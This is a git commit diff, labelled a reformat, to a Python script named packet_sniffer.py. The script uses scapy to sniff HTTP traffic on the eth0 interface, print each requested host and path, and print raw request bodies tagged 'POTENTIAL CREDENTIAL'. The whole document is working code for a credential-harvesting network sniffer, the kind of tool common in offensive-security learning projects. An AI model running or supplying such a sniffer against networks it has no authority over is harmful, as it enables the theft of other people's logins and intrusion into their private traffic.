61958df037dc24c63e7f65d53f41ebd28a943ea2
datthinh1801 <44528004+datthinh1801@users.noreply.github.com>
2021-05-01 05:38:37 -0400

    Reformat code

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -7,10 +7,24 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_packet)
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_potential_credentials(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        return load
+
+
 def process_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)
+        url = get_url(packet).decode()
+        print("[+] HTTP request > ", url)
+
+        credential = get_potential_credentials(packet)
+        if credential is not None:
+            print("\n\n[+] POTENTIAL CREDENTIAL > ", credential.decode(), "\n\n")
 
 
 sniff("eth0")
